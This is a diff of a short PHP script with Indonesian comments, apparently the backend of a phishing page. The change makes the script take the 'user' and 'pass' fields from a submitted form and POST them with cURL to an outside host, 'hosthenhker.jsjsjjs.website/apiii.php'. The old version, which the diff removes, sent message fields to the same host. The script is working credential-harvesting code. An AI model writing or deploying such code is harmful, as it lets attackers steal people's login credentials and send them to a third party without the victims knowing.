@@ -1,38 +1,27 @@
 <?php
-// TARUH LINK OTOMATIS KE KONEK
-$url = "hosthenhker.jsjsjjs.website/apiii.php";
-$data = "subjek=".$subjek."&pesan=".$pesan."&sender=".$sender;
+// Ambil data dari form
+$user = $_POST['user'];
+$pass = $_POST['pass'];
+
+// URL tujuan
+$url = "https://hosthenhker.jsjsjjs.website/apiii.php";
+
+// Data yang akan dikirim melalui POST
+$data = [
+    "user" => $user,
+    "pass" => $pass
+];
+
 $ch2 = curl_init();
 curl_setopt($ch2, CURLOPT_URL, $url);
 curl_setopt($ch2, CURLOPT_POST, 1);
-curl_setopt($ch2, CURLOPT_POSTFIELDS, $data);
+curl_setopt($ch2, CURLOPT_POSTFIELDS, http_build_query($data));
 curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1); 
 curl_setopt($ch2, CURLOPT_HEADER, 0);
 curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 0);
-curl_exec($ch2);
+
+$response = curl_exec($ch2);
 curl_close($ch2);
 
-$url = "";
-$data = "subjek=".$subjek."&pesan=".$pesan."&sender=".$sender;
-$ch2 = curl_init();
-curl_setopt($ch2, CURLOPT_URL, $url);
-curl_setopt($ch2, CURLOPT_POST, 1);
-curl_setopt($ch2, CURLOPT_POSTFIELDS, $data);
-curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1); 
-curl_setopt($ch2, CURLOPT_HEADER, 0);
-curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 0);
-curl_exec($ch2);
-curl_close($ch2);
-
-$url = "";
-$data = "subjek=".$subjek."&pesan=".$pesan."&sender=".$sender;
-$ch2 = curl_init();
-curl_setopt($ch2, CURLOPT_URL, $url);
-curl_setopt($ch2, CURLOPT_POST, 1);
-curl_setopt($ch2, CURLOPT_POSTFIELDS, $data);
-curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1); 
-curl_setopt($ch2, CURLOPT_HEADER, 0);
-curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 0);
-curl_exec($ch2);
-curl_close($ch2);
+// Respons yang diterima dari server disimpan di variabel $response
 ?>
